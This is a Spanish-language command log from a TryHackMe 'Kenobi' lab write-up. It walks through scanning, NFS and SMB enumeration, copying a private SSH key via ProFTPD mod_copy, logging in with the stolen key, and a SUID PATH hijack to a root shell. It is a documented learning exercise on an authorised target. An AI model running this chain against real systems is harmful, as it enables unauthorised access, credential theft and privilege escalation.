@@ -1,0 +1,127 @@
+# Bitácora de comandos — Kenobi
+# Objetivo: 10.64.134.243
+# Laboratorio autorizado: TryHackMe
+# Usuario THM: camiluolivera2506
+
+## Reconocimiento y conectividad
+
+ping -c 4 10.64.134.243
+
+## Escaneo de puertos
+
+nmap -p- --min-rate 5000 -T4 -oA ~/TP_THM/evidencias/escaneo/KB-02_nmap 10.64.134.243
+
+## Identificación de servicios
+
+nmap -sC -sV -p 21,22,80,111,139,445,2049,35437,43057,48695,58469 -oA ~/TP_THM/evidencias/escaneo/KB-03_nmap_servicios 10.64.134.243
+
+## Enumeración NFS
+
+showmount -e 10.64.134.243
+
+rpcinfo -p 10.64.134.243
+
+nmap -p 2049 --script nfs-showmount 10.64.134.243
+
+## Enumeración SMB
+
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.64.134.243
+
+smbclient -L //10.64.134.243 -N
+
+smbclient //10.64.134.243/anonymous -N
+
+ls
+
+## Enumeración de ProFTPD
+
+nc 10.64.134.243 21
+
+searchsploit ProFTPD 1.3.5
+
+## Explotación controlada de mod_copy
+
+SITE CPFR /home/kenobi/.ssh/id_rsa
+
+SITE CPTO /var/tmp/id_rsa
+
+## Montaje del recurso NFS
+
+mkdir -p ~/TP_THM/mnt/kenobi_var
+
+sudo mount -t nfs 10.64.134.243:/var ~/TP_THM/mnt/kenobi_var
+
+ls -l ~/TP_THM/mnt/kenobi_var/tmp/
+
+## Copia y protección local de la clave
+
+cp ~/TP_THM/mnt/kenobi_var/tmp/id_rsa ~/TP_THM/id_rsa_kenobi
+
+chmod 600 ~/TP_THM/id_rsa_kenobi
+
+ls -l ~/TP_THM/id_rsa_kenobi
+
+## Acceso SSH
+
+ssh -i ~/TP_THM/id_rsa_kenobi kenobi@10.64.134.243
+
+whoami
+
+## Enumeración del sistema y privilegios
+
+cat /home/kenobi/user.txt
+
+find / -perm -u=s -type f 2>/dev/null
+
+ls -l /usr/bin/menu
+
+strings /usr/bin/menu
+
+which curl
+
+echo $PATH
+
+## Escalada de privilegios mediante PATH
+
+mkdir -p /home/kenobi/bin
+
+echo '#!/bin/sh' > /home/kenobi/bin/curl
+echo 'id' >> /home/kenobi/bin/curl
+chmod +x /home/kenobi/bin/curl
+
+ls -l /home/kenobi/bin/curl
+
+/usr/bin/menu
+
+## Obtención de shell con privilegios
+
+echo '#!/bin/sh' > /home/kenobi/bin/curl
+echo '/bin/sh' >> /home/kenobi/bin/curl
+chmod +x /home/kenobi/bin/curl
+
+/usr/bin/menu
+
+whoami
+
+## Verificación de privilegios
+
+cat /root/root.txt
+
+## Observaciones
+
+Se identificó un recurso NFS que exportaba /var y permitió acceder al
+contenido del directorio /var/tmp.
+
+Mediante la funcionalidad mod_copy de ProFTPD se pudo copiar una clave
+privada SSH perteneciente al usuario kenobi hacia /var/tmp.
+
+La clave fue copiada al entorno local de Kali y protegida con permisos
+restrictivos antes de utilizarla para la conexión SSH.
+
+El binario SUID /usr/bin/menu pertenecía a root y ejecutaba comandos
+utilizando el PATH del usuario. Esto permitió demostrar una escalada de
+privilegios mediante manipulación controlada del PATH dentro del
+laboratorio autorizado.
+
+No se incluyen contraseñas, claves privadas completas ni flags en esta
+bitácora.
